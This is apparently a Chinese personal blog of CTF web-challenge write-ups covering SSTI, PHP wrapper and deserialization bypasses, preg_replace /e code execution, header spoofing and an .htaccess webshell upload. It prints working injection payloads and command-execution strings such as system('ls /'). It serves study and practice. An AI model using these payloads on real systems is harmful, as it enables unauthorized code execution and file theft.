<h2 id="2020-04-02"><a href="#2020-04-02" class="headerlink" title="2020.04.02"></a>2020.04.02</h2><h2 id="BJDCTF-2nd-fake-google"><a href="#BJDCTF-2nd-fake-google" class="headerlink" title="[BJDCTF 2nd]fake google"></a>[BJDCTF 2nd]fake google</h2><p>这道题目 增加知识体系了</p>
<p>首先 我不会做 然后看了WP 说是利用python渲染  ssti</p>
<p><a class="link"   href="https://xz.aliyun.com/t/3679" >https://xz.aliyun.com/t/3679<i class="fas fa-external-link-alt"></i></a></p>
<p>然后就去学习了</p>
<p>ssti的详细在 ssti那篇博文上。</p>
<p>说说解题过程吧</p>
<p>首先 <code>name=&#123;&#123;7*8&#125;&#125;</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/2020040314554530.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
                     
                ></p>
<p>那么一步步测试</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__bases__&#125;&#125;</span><br><span class="line">&#123;&#123;[].__class__.__bases__[<span class="number">0</span>]&#125;&#125;</span><br><span class="line">&#123;&#123;[]。————<span class="keyword">class</span>.__bases__[<span class="number">0</span>]..__subclasses__()&#125;&#125;//找到目标类</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;os.wrap_close&#x27;</span>&gt;   这个类很有用  可以直接直线系统命令</span><br><span class="line">&#123;&#123;[].__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">117</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br><span class="line">利用命令了</span><br><span class="line">之后 linux命令插入  </span><br></pre></td></tr></table></figure>

<p>参考：<a class="link"   href="https://blog.csdn.net/ChenZIDu/article/details/105159197" >https://blog.csdn.net/ChenZIDu/article/details/105159197<i class="fas fa-external-link-alt"></i></a></p>
<h2 id="BJDCTF-2nd-old-hack"><a href="#BJDCTF-2nd-old-hack" class="headerlink" title="[BJDCTF 2nd]old hack"></a>[BJDCTF 2nd]old hack</h2><p>这道题目很像之前写合天训练赛的题目</p>
<p>搜索出现有的 nday </p>
<p>首先一进去</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://img2020.cnblogs.com/blog/1212355/202003/1212355-20200324191727880-2091026713.png"
                     
                ></p>
<p>thinkphp 中  可以利用 <code>127.0.0.1/index.php/s=xxx</code>来debug</p>
<p>那么我们亦可以利用它来查看版本</p>
<p>查的 think-version  5.0.23，</p>
<p>之后直接查找漏洞就好了。。</p>
<p>我发现大多数flag都在 根目录那里。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/20200403153123482.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
                     
                ></p>
<h2 id="2020-04-03"><a href="#2020-04-03" class="headerlink" title="2020.04.03"></a>2020.04.03</h2><h2 id="BJDCTF-2nd-假猪套天下第一"><a href="#BJDCTF-2nd-假猪套天下第一" class="headerlink" title="[BJDCTF 2nd]假猪套天下第一"></a>[BJDCTF 2nd]假猪套天下第一</h2><p>这道题目 纯属靠http头</p>
<p>主要考</p>
<p>1、cookie 设置时间 99年  <code>Cookie: PHPSESSID=cibo5j3ug8t8q101utm8ev1mv1;time=999999999</code></p>
<p>2、之后XXF 伪造IP</p>
<p>3、Referer 浏览器访问的前一个页面</p>
<p>4、User-Agent 系统消息自带</p>
<p>5、From 请求的用户的邮件地址</p>
<p>6、via  由哪个代理发出</p>
<p>最终效果如下 ↓</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/20200403163337659.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
                     
                ></p>
<p>然后可以看到Base64编码</p>
<p>解码即可。</p>
<h2 id="MRCTF2020-套娃"><a href="#MRCTF2020-套娃" class="headerlink" title="[MRCTF2020]套娃"></a>[MRCTF2020]套娃</h2><p>考察点：函数、换行污染、file_get_contents等于某个字符串、简单的解码脚本、部分_  .  操作转换</p>
<p>一进去  F12查看</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/20200404002619579.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
                     
                ></p>
<p>函数解释：</p>
<p><code>substr_count(string $haystack , string $needle)</code>:</p>
<p>返回子字符串needle在字符串haystack中出现的次数 其中needle区分大小写</p>
<p><code>preg_match ( string $pattern , string $subject）</code>：</p>
<p>返回pattern匹配的次数，它的值为0次或者1次。preg_match在第一次匹配就停止搜索。</p>
<p>这里的<code>QUERY_STRING</code>就是url&#x2F;?后面所有值</p>
<p>例如：<code>127.0.0.1/index.php?a=3&amp;b=5</code></p>
<p>它的<code>$_SERVER[&#39;QUERY_STRING&#39;]=a=3&amp;b=5</code></p>
<p>Y1ng师傅说 <code>$_SERVER[&#39;QUERY_STRING&#39;]</code>是不会URL解码</p>
<p>所以一般都是用URL编码来绕过。这里ban了%5f。：</p>
<ol>
<li>%5F</li>
<li>b.u.p.t（点代替_）</li>
<li>b u p t（空格代替_）</li>
</ol>
<p>之后换行污染绕过。</p>
<p>payload&#x3D;<code>?b.u.p.t=23333%0a</code></p>
<p>得到文件名字 √ :secrettw.php   ——&gt;访问</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/20200404004352587.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
                     
                ></p>
<p>首先： 这个伪造IP<code>Client-IP:127.0.0.1</code>  或者使用 <code>X-Forwarded-For:127.0.0.1</code></p>
<p>POST 一个Merak参数   </p>
<p>嗯哼 出现源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);  </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;takeip.php&#x27;</span>; </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;.&#x27;</span>);  </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>; </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;Merak&#x27;</span>]))&#123;  </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);  </span><br><span class="line">    <span class="keyword">die</span>();  <span class="comment">//注意这里！如果POST了Merak就会Die</span></span><br><span class="line">&#125;  </span><br><span class="line"> </span><br><span class="line"> <span class="comment">//重点在这个加密函数上</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params"><span class="variable">$v</span></span>)</span>&#123;  </span><br><span class="line">    <span class="variable">$v</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$v</span>);  </span><br><span class="line">    <span class="variable">$re</span> = <span class="string">&#x27;&#x27;</span>;  </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$v</span>);<span class="variable">$i</span>++)&#123;  </span><br><span class="line">        <span class="variable">$re</span> .= <span class="title function_ invoke__">chr</span> ( <span class="title function_ invoke__">ord</span> (<span class="variable">$v</span>[<span class="variable">$i</span>]) + <span class="variable">$i</span>*<span class="number">2</span> );  </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$re</span>;  </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Local access only!&#x27;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>; </span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">getIp</span>(); </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span>!=<span class="string">&#x27;127.0.0.1&#x27;</span>) </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;</span>.<span class="variable">$ip</span>; </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span> === <span class="string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;2333&#x27;</span>]) === <span class="string">&#x27;todat is a happy day&#x27;</span> )&#123; </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Your REQUEST is:&quot;</span>.<span class="title function_ invoke__">change</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]); </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">change</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])); &#125; </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>审查审查 </p>
<p>IP检验，file_get_contents()等于某个字符串，一个加密</p>
<p>第一层 IP检测伪造</p>
<p>第二层 file_get_contents()等于特定字符串</p>
<p>这道题目 CGCTF里有过</p>
<p>解决方法：</p>
<p>绕过方式有多种：</p>
<ul>
<li>使用php:&#x2F;&#x2F;input伪协议绕过<br>① 将要GET的参数?xxx&#x3D;php:&#x2F;&#x2F;input<br>② 用post方法传入想要file_get_contents()函数返回的值</li>
<li>用data:&#x2F;&#x2F;伪协议绕过<br>将url改为：?xxx&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,想要file_get_contents()函数返回的值的base64编码<br>或者将url改为：?xxx&#x3D;data:text&#x2F;plain,(url编码的内容)</li>
</ul>
<p>这里采用 data:&#x2F;&#x2F;text&#x2F;plain;base64,dG9kYXQgaXMgYSBoYXBweSBkYXk&#x3D;</p>
<p>第三层写个解码脚本就好了 </p>
<p>这个以前攻防世界有道类似的解码题 脚本就不打出来了</p>
<p>最好的payload:<code>?2333=data://text/plain;base64,dG9kYXQgaXMgYSBoYXBweSBkYXk=&amp;file=ZmpdYSZmXGI=&amp;file=ZmpdYSZmXGI=</code></p>
<h2 id="2020-04-04"><a href="#2020-04-04" class="headerlink" title="2020.04.04"></a>2020.04.04</h2><p>今天是清明，为先人祭奠，生者更应奋斗努力。</p>
<h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><p>这道题目 一进去就看到了源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Not now!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//useless.php</span></span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$password</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>1、file_get_contents() 利用协议绕过</p>
<p>2、然后。那个<code>file</code>和flag的正则误导我了。。</p>
<p>这里应该用伪协议配合查看useless的源码</p>
<p>我仔细想了想  它那个正则flag可能是不让我直接读取flag的源码。</p>
<p>看看后面利用反序列化 那么应该有类存在 哪来的类？？ 只可能是在useless中了</p>
<p>3、补充下文件包含的内容</p>
<p>在我们看到文件包含的时候，可以有读取源码   输入字符串  配合文件上传</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/20190917100424906.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
                     
                ></p>
<p>特别是<code>include(  $file  )</code>   就可以直接查看到源码！！！</p>
<p>下面解题步骤</p>
<p>查看useless.php源码</p>
<p><code>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</code></p>
<p>可以得到：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span> = <span class="string">&#x27;flag.php&#x27;</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line">O:<span class="number">4</span>:<span class="string">&quot;Flag&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;file&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;&#125;  <span class="comment">//反序列化后</span></span><br></pre></td></tr></table></figure>

<p>很明显 反序列化就可以了</p>
<p>最好payload:<code>?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</code></p>
<p>查看源码 结束。</p>
<h2 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h2><p>这道题目 考点很好，又学到了知识</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;I have a dream&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Not now!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//next.php</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>直接源码 很明显 目的是php伪协议查看next.php的源码</p>
<p>查看得到：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        <span class="variable">$str</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">complex</span>(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这个是利用<code>preg_replace()</code>函数进行命令执行的</p>
<p>主要的细节在这篇文章：👇</p>
<p><a class="link"   href="https://xz.aliyun.com/t/2557" >https://xz.aliyun.com/t/2557<i class="fas fa-external-link-alt"></i></a></p>
<p>说一下怎么解题吧。</p>
<p><code>next.php?/s*=$&#123;eval($_POST[cmd])&#125;</code></p>
<p>这里因为他好像是把在URL里面的单引号进行转码了。所以不能直接<code>&#39;ls&#39;</code></p>
<p>最后就是在burp里面进行<code>system(&#39;ls /&#39;);</code></p>
<p>这里再说一下 <code>eval()  和 system()</code>函数。</p>
<h3 id="有一说一"><a href="#有一说一" class="headerlink" title="有一说一"></a>有一说一</h3><p>今天一共做了十二道题目 ，都是那种入门题。没什么难度。所以就不写payload了。</p>
<h2 id="2020-04-05"><a href="#2020-04-05" class="headerlink" title="2020.04.05"></a>2020.04.05</h2><h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><p>首先，进去啥也没看出来</p>
<p>扫一扫，git泄露</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/20200406181842948.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
                     
                ></p>
<p>然后查看源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$yds</span> = <span class="string">&quot;dog&quot;</span>;</span><br><span class="line"><span class="variable">$is</span> = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line"><span class="variable">$handsome</span> = <span class="string">&#x27;yds&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;the flag is: &quot;</span>.<span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure>

<p>考点就很清楚了。变量覆盖</p>
<p>我觉得这个很想</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="number">2</span>; <span class="variable">$b</span> = <span class="number">3</span>;</span><br><span class="line"><span class="variable">$temp</span> = <span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$b</span>; <span class="variable">$b</span> = <span class="variable">$temp</span>;</span><br></pre></td></tr></table></figure>

<p>整理整理思路 大致的payload:<code>/?handsome=flag&amp;flag=handsome</code></p>
<p>然后就出flag了。主要是保存住flag的值。</p>
<h2 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h2><p>这道题目很有意思</p>
<p>首先，我测试出来应该是一个ssti。</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/20200406211119701.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
                     
                ></p>
<p>然后我就试了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[].__class__</span><br></pre></td></tr></table></figure>



<p>看看回显。结果报错了</p>
<p>报错显示了 Smarty Compiler。</p>
<p>注意到这里不是python的flask模板渲染。</p>
<p>这里应该是PHP的模板渲染！！</p>
<p>php模板渲染直接 利用</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">&#123;&#123;system(&#x27;ls /&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>



<p>实际上模板渲染的本质还是用户输入的被认为安全了</p>
<p>那么我们就可以构造命令！</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/20200406211458323.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
                     
                ></p>
<h2 id="2020-04-06"><a href="#2020-04-06" class="headerlink" title="2020.04.06"></a>2020.04.06</h2><h2 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h2><p>又到了不会的上传题了</p>
<p>我最多的都是 00截断 然后改头。</p>
<p>这道题目用<code>.htaccess</code></p>
<p>这个我一直都知道有这种利用方式。但是我没理会。</p>
<p>下面详细说说。</p>
<p>.htaccess是Apache的一特色。一般来说，配置文件的作用范围都是全局的，但Apache提供了一种很方便的、可作用于当前目录及其子目录的配置文件——.htaccess（分布式配置文件）</p>
<p>我们这里只关心.htaccess文件的一个作用——MIME类型修改。如在.htaccess文件中写入：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">&quot;shell.jpg&quot;</span>&gt;</span><br><span class="line">  SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>

<p>就成功地使该.htaccess文件所在目录及其子目录中的后缀为.jpg的文件被Apache当做php文件</p>
<p>而这是为什么呢？ 我并不明白原理。按书上说，这是配置文件。以后再说吧。</p>
<p>那么先上传.htaccess文件！</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/20200406220458270.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
                     
                ></p>
<p>然后我们再上传.jpg的脚本。这时，我们可以直接把.jpg以php运行</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://img-blog.csdnimg.cn/20200406220615668.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0RVT2FuMDIxNg==,size_16,color_FFFFFF,t_70"
                     
                ></p>
<p>之后蚁剑连接就好了。</p>
<p>然后今天我又遇到一道难题了。。</p>
<p>操！！ 太菜啦啊！！！</p>
<p>这道难题的考点在无字母无数字的RCE！。</p>
<p>这个得在新的博客上写！ 哼！</p>
]]></content>
      <categories>
        <category>刷题</category>
      </categories>
  </entry>
  <entry>
    <title>四月安全憋屈-3</title>
    <url>/2020/04/16/%E5%9B%9B%E6%9C%88/%E5%9B%9B%E6%9C%88%E5%AE%89%E5%85%A8%E6%86%8B%E5%B1%88-3/</url>
    <content><![CDATA[<h2 id="2020-04-16"><a href="#2020-04-16" class="headerlink" title="2020.04.16"></a>2020.04.16</h2><p>太他娘的憋屈了</p>
<p>为什么每一道题目都这么难。。</p>
<p>憋屈。立个目标顺序做题。老子不选题目了！</p>
<p>【不然没选一题就不会一题。憋屈死我了！</p>
<h3 id="Jarvis-OJ-IN-A-Mes"><a href="#Jarvis-OJ-IN-A-Mes" class="headerlink" title="Jarvis OJ-IN A Mes"></a>Jarvis OJ-IN A Mes</h3><p>花了好久呜呜呜，太菜啦</p>
<p>不过我也已经打算一天一题，不求多！</p>
<span id="more"></span>

<h4 id="一进去-日常审查"><a href="#一进去-日常审查" class="headerlink" title="一进去 日常审查"></a>一进去 日常审查</h4><p><img  
                     lazyload
                     alt="image"
